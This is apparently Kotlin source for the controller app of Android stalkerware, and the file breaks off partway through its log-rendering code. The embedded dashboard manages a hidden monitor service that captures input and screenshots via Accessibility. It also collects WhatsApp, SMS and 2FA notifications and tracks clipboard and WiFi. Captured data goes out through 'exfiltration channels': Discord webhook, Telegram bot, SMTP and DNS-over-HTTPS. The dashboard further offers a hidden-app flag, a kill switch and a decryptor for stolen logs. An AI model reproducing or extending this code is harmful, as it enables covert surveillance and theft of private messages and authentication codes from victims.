package com.system.controller

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONArray
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Status Dashboard — the launcher entry point for the Controller APK.
 * Rebuilt as a Single Page Application (SPA) with bottom navigation tabs.
 * Combines Dashboard, Decryptor, and Uninstaller into a unified UI.
 */
class StatusActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private val handler = Handler(Looper.getMainLooper())
    private var refreshRunnable: Runnable? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.allowContentAccess = false
            settings.allowFileAccess = false
            webViewClient = WebViewClient()
            addJavascriptInterface(StatusBridge(), "Android")
        }
        setContentView(webView)

        loadSPA()
        startAutoRefresh()
    }

    override fun onResume() {
        super.onResume()
        startAutoRefresh()
    }

    override fun onPause() {
        super.onPause()
        stopAutoRefresh()
    }

    override fun onDestroy() {
        stopAutoRefresh()
        super.onDestroy()
    }

    private fun startAutoRefresh() {
        stopAutoRefresh()
        refreshRunnable = object : Runnable {
            override fun run() {
                updateStatusData()
                handler.postDelayed(this, 5000)
            }
        }
        handler.postDelayed(refreshRunnable!!, 5000)
    }

    private fun stopAutoRefresh() {
        refreshRunnable?.let { handler.removeCallbacks(it) }
        refreshRunnable = null
    }

    inner class StatusBridge {
        @JavascriptInterface
        fun togglePause() {
            val status = MonitorClient.getStatus(this@StatusActivity)
            if (status.isPaused) {
                MonitorClient.sendCommand(this@StatusActivity, "resume")
            } else {
                MonitorClient.sendCommand(this@StatusActivity, "pause")
            }
            runOnUiThread { updateStatusData() }
        }

        @JavascriptInterface
        fun loadLogs(): String {
            val logs = MonitorClient.getLogs(this@StatusActivity)
            val jsonArray = JSONArray()
            logs.forEach { jsonArray.put(it) }
            return jsonArray.toString()
        }

        @JavascriptInterface
        fun sendCommand(cmd: String): Boolean {
            return MonitorClient.sendCommand(this@StatusActivity, cmd)
        }

        @JavascriptInterface
        fun vibrate(ms: Long) {
            ControllerApp.vibrate(this@StatusActivity, ms)
        }

        @JavascriptInterface
        fun refreshStatus() {
            runOnUiThread { updateStatusData() }
        }
    }

    private fun updateStatusData() {
        val data = collectStatusJson()
        webView.evaluateJavascript("if(typeof updateUI==='function'){updateUI($data);}", null)
    }

    private fun collectStatusJson(): String {
        val s = MonitorClient.getStatus(this)
        val now = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        return """{
            "monitorInstalled": ${s.monitorInstalled},
            "isRunning": ${s.isRunning},
            "isPaused": ${s.isPaused},
            "isConfigured": ${s.isConfigured},
            "accEnabled": ${s.accEnabled},
            "notifEnabled": ${s.notifEnabled},
            "batteryExempt": ${s.batteryExempt},
            "hasDiscord": ${s.hasDiscord},
            "hasTelegram": ${s.hasTelegram},
            "hasSmtp": ${s.hasSmtp},
            "hasDoH": true,
            "logCount": ${s.logCount},
            "fileSize": "${s.fileSizeStr}",
            "hideApp": ${s.hideApp},
            "killSwitch": ${s.killSwitch},
            "localLog": ${s.localLog},
            "thermalLevel": "${s.thermalLevel}",
            "batteryTemp": ${s.batteryTemp},
            "batteryLevel": ${s.batteryLevel},
            "isCharging": ${s.isCharging},
            "powerSave": ${s.powerSave},
            "lastUpdate": "$now"
        }"""
    }

    private fun loadSPA() {
        val initData = collectStatusJson()
        val html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
            <title>Controller SPA</title>
            <style>
                :root {
                    --primary: #3b82f6;
                    --bg: #0f172a;
                    --card: #1e293b;
                    --glass: rgba(30,41,59,0.85);
                    --text: #f8fafc;
                    --dim: #94a3b8;
                    --border: rgba(255,255,255,0.1);
                    --danger: #ef4444;
                    --success: #10b981;
                    --warning: #f59e0b;
                }
                * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                    background: var(--bg);
                    color: var(--text);
                    padding-bottom: 70px;
                    overflow-x: hidden;
                }

                /* SVGs */
                svg { width: 1em; height: 1em; }

                /* Header */
                .header {
                    text-align: center;
                    padding: 16px 0;
                    border-bottom: 1px solid var(--border);
                    background: var(--glass);
                    backdrop-filter: blur(10px);
                    -webkit-backdrop-filter: blur(10px);
                    position: sticky;
                    top: 0;
                    z-index: 10;
                }
                .header h1 { font-size: 18px; font-weight: 800; display: flex; align-items: center; justify-content: center; gap: 8px; }
                .header .sub { color: var(--dim); font-size: 11px; margin-top: 2px; }

                /* Tab Content */
                .tab-content { display: none; padding: 16px; animation: fade 0.3s; }
                .tab-content.active { display: block; }
                @keyframes fade { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

                /* Bottom Nav */
                .bottom-nav {
                    position: fixed;
                    bottom: 0;
                    left: 0;
                    right: 0;
                    height: 60px;
                    background: var(--glass);
                    backdrop-filter: blur(20px);
                    -webkit-backdrop-filter: blur(20px);
                    border-top: 1px solid var(--border);
                    display: flex;
                    z-index: 100;
                }
                .nav-item {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    color: var(--dim);
                    font-size: 10px;
                    font-weight: 600;
                    transition: all 0.2s;
                }
                .nav-item.active { color: var(--primary); }
                .nav-item svg { font-size: 20px; margin-bottom: 4px; transition: transform 0.2s; }
                .nav-item.active svg { transform: scale(1.1); }

                /* --- DASHBOARD TAB --- */
                .status-hero {
                    background: var(--card); border: 1px solid var(--border); border-radius: 16px;
                    padding: 20px; text-align: center; margin-bottom: 12px; position: relative; overflow: hidden;
                }
                .status-hero.running { border-color: rgba(16,185,129,0.3); }
                .status-hero.running::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:var(--success); }
                .status-hero.paused { border-color: rgba(245,158,11,0.3); }
                .status-hero.paused::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:var(--warning); }
                .status-hero.stopped { border-color: rgba(239,68,68,0.2); }
                .status-hero.nomonitor { border-color: rgba(148,163,184,0.2); }
                
                .status-icon { width:56px; height:56px; border-radius:16px; display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:24px; }
                .status-icon.running { background:rgba(16,185,129,0.15); color: var(--success); }
                .status-icon.paused { background:rgba(251,191,36,0.15); color: var(--warning); }
                .status-icon.stopped { background:rgba(255,61,113,0.1); color: var(--danger); }
                .status-icon.nomonitor { background:rgba(148,163,184,0.1); color: var(--dim); }
                
                .status-label { font-size:18px; font-weight:800; letter-spacing:-0.02em; }
                .status-sub { color:var(--dim); font-size:11px; margin-top:4px; }
                
                .stats { display:flex; gap:8px; margin-bottom:12px; }
                .stat-card { flex:1; background:var(--card); border:1px solid var(--border); border-radius:12px; padding:12px 8px; text-align:center; }
                .stat-val { font-size:18px; font-weight:800; color:var(--primary); }
                .stat-label { font-size:9px; color:var(--dim); text-transform:uppercase; letter-spacing:0.1em; margin-top:4px; }
                
                .section-title { font-size:10px; color:var(--dim); text-transform:uppercase; letter-spacing:0.15em; font-weight:700; margin:16px 0 8px; display: flex; align-items: center; gap: 4px; }
                .item-card { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:12px 14px; margin-bottom:6px; display:flex; align-items:center; gap:10px; }
                .item-icon { width:32px; height:32px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
                .item-icon.on { background:rgba(16,185,129,0.15); color:var(--success); }
                .item-icon.off { background:rgba(255,61,113,0.1); color:var(--danger); }
                .item-icon.na { background:rgba(148,163,184,0.1); color:var(--dim); }
                .item-icon.warn { background:rgba(251,191,36,0.15); color:var(--warning); }
                
                .item-info { flex:1; }
                .item-name { font-size:13px; font-weight:600; }
                .item-desc { font-size:10px; color:var(--dim); margin-top:1px; }
                .item-status { font-size:10px; font-weight:700; padding:3px 8px; border-radius:6px; flex-shrink:0; }
                .item-status.on { background:rgba(16,185,129,0.15); color:var(--success); }
                .item-status.off { background:rgba(255,61,113,0.1); color:var(--danger); }
                .item-status.na { background:rgba(148,163,184,0.1); color:var(--dim); }
                .item-status.warn { background:rgba(251,191,36,0.15); color:var(--warning); }
                
                .flags-row { display:flex; gap:6px; margin-bottom:12px; flex-wrap:wrap; }
                .flag { font-size:10px; font-weight:600; padding:4px 10px; border-radius:8px; border:1px solid var(--border); background:var(--card); color:var(--dim); display:flex; align-items:center; gap:4px;}
                .flag.active { border-color:rgba(59,130,246,0.3); color:var(--primary); background:rgba(59,130,246,0.1); }
                
                .fab-pause {
                    position: fixed; bottom: 80px; right: 16px; width: 56px; height: 56px;
                    border-radius: 28px; background: var(--primary); color: var(--bg);
                    display: flex; align-items: center; justify-content: center; font-size: 24px;
                    box-shadow: 0 4px 12px rgba(59,130,246,0.3); z-index: 50; transition: transform 0.2s;
                }
                .fab-pause:active { transform: scale(0.9); }
                .fab-pause.paused { background: var(--warning); box-shadow: 0 4px 12px rgba(251,191,36,0.3); }

                /* --- LOGS TAB --- */
                .search { width:100%; padding:10px 14px; background:var(--card); border:1px solid var(--border); border-radius:10px; color:var(--text); font-size:13px; margin-bottom:12px; outline:none; }
                .search:focus { border-color:var(--primary); }
                .btn-refresh-logs { width: 100%; padding: 12px; background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); border-radius: 10px; color: var(--primary); font-weight: 600; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.2s; }
                .btn-refresh-logs:active { transform: scale(0.98); }
                .log-entry { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:10px 12px; margin-bottom:6px; font-size:11px; font-family:'Courier New',monospace; word-break:break-all; color:var(--dim); line-height:1.5; }
                .log-entry .tag { color:var(--primary); font-weight:700; }
                .log-entry .time { color:var(--success); font-size:10px; }
                .empty { text-align:center; padding:40px; color:var(--dim); }
                .empty svg { font-size:40px; margin-bottom:12px; opacity: 0.5; }

                /* --- TOOLS TAB --- */
                .tool-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 16px; }
                .tool-card h2 { font-size: 16px; font-weight: 700; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
                .tool-card p { font-size: 12px; color: var(--dim); margin-bottom: 16px; line-height: 1.5; }
                .tool-btn { width: 100%; padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; border: none; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; transition: transform 0.2s; }
                .tool-btn:active { transform: scale(0.98); }
                .btn-safe { background: rgba(16,185,129,0.15); color: var(--success); border: 1px solid rgba(16,185,129,0.3); }
                .btn-warn { background: rgba(251,191,36,0.15); color: var(--warning); border: 1px solid rgba(251,191,36,0.3); }
                .btn-danger { background: rgba(255,61,113,0.15); color: var(--danger); border: 1px solid rgba(255,61,113,0.3); }

                /* Common SVG icons */
                .i-check { stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                    System Tools
                </h1>
                <div class="sub">Controller Dashboard</div>
            </div>

            <!-- DASHBOARD TAB -->
            <div id="tab-dashboard" class="tab-content active">
                <div id="heroCard" class="status-hero stopped">
                    <div id="heroIcon" class="status-icon stopped"></div>
                    <div id="heroLabel" class="status-label">Loading...</div>
                    <div id="heroSub" class="status-sub">Connecting...</div>
                </div>
                
                <div class="stats">
                    <div class="stat-card"><div class="stat-val" id="statLogs">-</div><div class="stat-label">Logs</div></div>
                    <div class="stat-card"><div class="stat-val" id="statSize">-</div><div class="stat-label">Data</div></div>
                    <div class="stat-card"><div class="stat-val" id="statTemp">-</div><div class="stat-label">Temp</div></div>
                </div>

                <div class="section-title">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                    Device Health
                </div>
                <div id="thermalCards"></div>

                <div class="section-title">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                    Active Monitors
                </div>
                <div id="monitorCards"></div>

                <div class="section-title">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
                    Exfiltration Channels
                </div>
                <div id="channelCards"></div>

                <div class="section-title">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
                    Configuration Flags
                </div>
                <div id="flagsRow" class="flags-row"></div>
                
                <div id="fabPause" class="fab-pause" onclick="togglePause()">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>
                </div>
            </div>

            <!-- LOGS TAB -->
            <div id="tab-logs" class="tab-content">
                <div class="btn-refresh-logs" onclick="refreshLogs()">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
                    Reload Logs
                </div>
                <input class="search" type="text" placeholder="Search decrypted logs..." oninput="filterLogs(this.value)" id="searchInput"/>
                <div class="stats" style="margin-bottom: 16px;">
                    <div class="stat-card"><div class="stat-val" id="totalCount">-</div><div class="stat-label">Total</div></div>
                    <div class="stat-card"><div class="stat-val" id="shownCount">-</div><div class="stat-label">Shown</div></div>
                </div>
                <div id="logContainer">
                    <div class="empty">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
                        <div>Tap Reload to fetch logs</div>
                    </div>
                </div>
            </div>

            <!-- TOOLS TAB -->
            <div id="tab-tools" class="tab-content">
                <div class="tool-card">
                    <h2>
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                        Service Control
                    </h2>
                    <p>Standard service operations. These can be safely reversed by running the setup wizard again.</p>
                    <button class="tool-btn btn-safe" onclick="confirmCmd('show_app', 'Show Monitor App icon in the app drawer?')">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                        Show App in Launcher
                    </button>
                    <button class="tool-btn btn-warn" onclick="confirmCmd('stop', 'Stop the Monitor Service? It will not restart automatically.')">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/></svg>
                        Stop Service
                    </button>
                </div>

                <div class="tool-card">
                    <h2 style="color: var(--danger)">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                        Danger Zone
                    </h2>
                    <p>Destructive actions cannot be undone. Data will be permanently deleted.</p>
                    <button class="tool-btn btn-danger" onclick="confirmCmd('wipe', 'Permanently wipe all captured logs? This cannot be undone.')">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                        Wipe Local Data
                    </button>
                    <button class="tool-btn btn-danger" onclick="confirmCmd('nuke', 'Nuke the installation? This wipes data, uninstalls the monitor, and cleans up.')">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg>
                        Nuke & Uninstall Monitor
                    </button>
                </div>
            </div>

            <!-- BOTTOM NAV -->
            <div class="bottom-nav">
                <div class="nav-item active" onclick="switchTab('dashboard', this)">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
                    Dashboard
                </div>
                <div class="nav-item" onclick="switchTab('logs', this)">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                    Decryptor
                </div>
                <div class="nav-item" onclick="switchTab('tools', this)">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
                    Tools
                </div>
            </div>

            <script>
                // --- TAB LOGIC ---
                function switchTab(tabId, el) {
                    Android.vibrate(30);
                    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
                    document.getElementById('tab-' + tabId).classList.add('active');
                    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                    el.classList.add('active');
                    if(tabId === 'logs' && allLogs.length === 0) refreshLogs();
                }

                // --- DASHBOARD LOGIC ---
                let currentData = $initData;
                
                // SVG strings
                const svgCheck = '<svg class="i-check" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>';
                const svgX = '<svg class="i-check" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
                const svgMonitor = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>';
                const svgBattery = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="16" height="10" rx="2" ry="2"/><line x1="22" y1="11" x2="22" y2="13"/></svg>';
                const svgCharging = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 18H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h3.19M15 6h2a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-3.19"/><line x1="23" y1="13" x2="23" y2="11"/><polyline points="11 6 7 12 13 12 9 18"/></svg>';
                const svgAccess = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="5" r="2"/><line x1="12" y1="7" x2="12" y2="15"/><line x1="12" y1="15" x2="9" y2="21"/><line x1="12" y1="15" x2="15" y2="21"/><line x1="8" y1="10" x2="16" y2="10"/></svg>';
                const svgNotif = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>';
                const svgClip = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>';
                const svgWifi = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>';
                const svgDiscord = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>';
                const svgMail = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>';
                const svgGlobe = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>';
                const svgPlay = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>';
                const svgPause = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>';

                function renderItem(iconSvg, name, desc, isOn, statusText){
                    var cls = isOn === true ? 'on' : (isOn === false ? 'off' : 'na');
                    if (statusText === 'WARM' || statusText === 'HOT') cls = 'warn';
                    var txt = statusText || (isOn ? 'ACTIVE' : 'OFF');
                    return '<div class="item-card"><div class="item-icon '+cls+'">'+iconSvg+'</div><div class="item-info"><div class="item-name">'+name+'</div><div class="item-desc">'+desc+'</div></div><div class="item-status '+cls+'">'+txt+'</div></div>';
                }

                function togglePause() {
                    Android.vibrate(50);
                    Android.togglePause();
                }

                function updateUI(data){
                    currentData = data;
                    var hero = document.getElementById('heroCard');
                    var heroIcon = document.getElementById('heroIcon');
                    var heroLabel = document.getElementById('heroLabel');
                    var heroSub = document.getElementById('heroSub');
                    var fab = document.getElementById('fabPause');
                    
                    hero.className = 'status-hero'; heroIcon.className = 'status-icon';
                    if(!data.monitorInstalled){
                        hero.classList.add('nomonitor'); heroIcon.classList.add('nomonitor'); heroIcon.innerHTML = svgX;
                        heroLabel.textContent = 'Monitor Not Found'; heroLabel.style.color = '#94a3b8';
                        heroSub.textContent = 'Install the System Service APK first';
                        fab.style.display = 'none';
                    }else if(data.isRunning && !data.isPaused){
                        hero.classList.add('running'); heroIcon.classList.add('running'); heroIcon.innerHTML = svgCheck;
                        heroLabel.textContent = 'Service Running'; heroLabel.style.color = '#10b981';
                        heroSub.textContent = 'All monitors active • '+data.lastUpdate;
                        fab.style.display = 'flex'; fab.className = 'fab-pause running'; fab.innerHTML = svgPause;
                    }else if(data.isRunning && data.isPaused){
                        hero.classList.add('paused'); heroIcon.classList.add('paused'); heroIcon.innerHTML = svgPause;
                        heroLabel.textContent = 'Service Paused'; heroLabel.style.color = '#fbbf24';
                        heroSub.textContent = 'Monitoring suspended • '+data.lastUpdate;
                        fab.style.display = 'flex'; fab.className = 'fab-pause paused'; fab.innerHTML = svgPlay;
                    }else if(data.isConfigured){
                        hero.classList.add('stopped'); heroIcon.classList.add('stopped'); heroIcon.innerHTML = svgX;
                        heroLabel.textContent = 'Service Stopped'; heroLabel.style.color = '#ff3d71';
                        heroSub.textContent = 'Configured but not running';
                        fab.style.display = 'none';
                    }else{
                        hero.classList.add('stopped'); heroIcon.classList.add('stopped'); heroIcon.innerHTML = svgX;
                        heroLabel.textContent = 'Not Configured'; heroLabel.style.color = '#94a3b8';
                        heroSub.textContent = 'Run Setup in System Service app';
                        fab.style.display = 'none';
                    }
                    
                    document.getElementById('statLogs').textContent = data.logCount;
                    document.getElementById('statSize').textContent = data.fileSize;
                    document.getElementById('statTemp').textContent = data.batteryTemp.toFixed(1)+'°';
                    document.getElementById('statTemp').style.color = data.thermalLevel==='NORMAL'?'#3b82f6':(data.thermalLevel==='WARM'?'#f59e0b':(data.thermalLevel==='HOT'?'#f97316':'#ef4444'));
                    
                    // Thermal
                    var th = '';
                    var tempOn = data.thermalLevel === 'NORMAL' || data.thermalLevel === 'WARM';
                    th += renderItem(data.isCharging ? svgCharging : svgBattery, 'Battery Temperature', data.batteryTemp.toFixed(1)+'°C', tempOn, data.thermalLevel);
                    th += renderItem(data.isCharging ? svgCharging : svgBattery, 'Battery Level', data.batteryLevel+'%', data.batteryLevel > 15, data.isCharging ? 'CHARGING' : data.batteryLevel+'%');
                    th += renderItem(svgBattery, 'Battery Optimization', 'Background restriction check', data.batteryExempt, data.batteryExempt ? 'EXEMPT' : 'OPTIMIZED');
                    if(data.powerSave){ th += renderItem(svgBattery, 'Power Save Mode', 'System saver active', false, 'ON'); }
                    document.getElementById('thermalCards').innerHTML = th;
                    
                    // Monitors
                    var m = '';
                    m += renderItem(svgAccess, 'Accessibility Service', 'Input capture + screenshots', data.accEnabled);
                    m += renderItem(svgNotif, 'Notification Listener', 'WhatsApp, SMS, 2FA', data.notifEnabled);
                    m += renderItem(svgClip, 'Clipboard Monitor', 'Text copy detection', data.isRunning && !data.isPaused);
                    m += renderItem(svgWifi, 'WiFi Monitor', 'Network tracking', data.isRunning && !data.isPaused);
                    document.getElementById('monitorCards').innerHTML = m;
                    
                    // Channels
                    var c = '';
                    c += renderItem(svgDiscord, 'Discord Webhook', data.hasDiscord?'Configured':'Not set', data.hasDiscord);
                    c += renderItem(svgDiscord, 'Telegram Bot', data.hasTelegram?'Configured':'Not set', data.hasTelegram);
                    c += renderItem(svgMail, 'SMTP Email', data.hasSmtp?'Configured':'Not set', data.hasSmtp);
                    c += renderItem(svgGlobe, 'DNS-over-HTTPS', 'Fallback exfil', data.hasDoH, 'READY');
                    document.getElementById('channelCards').innerHTML = c;
                    
                    // Flags
                    var f = '';
                    f += '<div class="flag '+(data.localLog?'active':'')+'">📁 Local Cache</div>';
                    f += '<div class="flag '+(data.killSwitch?'active':'')+'">🎯 Kill Switch</div>';
                    f += '<div class="flag '+(data.hideApp?'active':'')+'">👻 Hidden App</div>';
                    document.getElementById('flagsRow').innerHTML = f;
                }
                updateUI(currentData);

                // --- LOGS LOGIC ---
                let allLogs = [];
                let filteredLogs = [];

                function refreshLogs() {
                    Android.vibrate(30);
                    try {
                        const raw = Android.loadLogs();
                        allLogs = JSON.parse(raw);
                        filterLogs(document.getElementById('searchInput').value);
                    } catch(e) {
                        document.getElementById('logContainer').innerHTML = '<div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><div>Could not fetch logs from Monitor</div></div>';
                    }
                }

                function filterLogs(query) {
                    if (!query) { filteredLogs = allLogs; }
                    else {
                        const q = query.toLowerCase();
                        filteredLogs = allLogs.filter(l => l.toLowerCase().includes(q));
                    }
                    renderLogs();
                }

                function renderLogs() {
                    var html = '';
                    if (filteredLogs.length === 0) {
                        html = '<div class="empty"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg><div>No decrypted logs found</div></div>';
                    } else {
                        filteredLogs.forEach(function(log) {
                            var highlighted = log
                                .replace(/^\[([^\]]+)\]/, '<span class="tag">[$1]</span>')
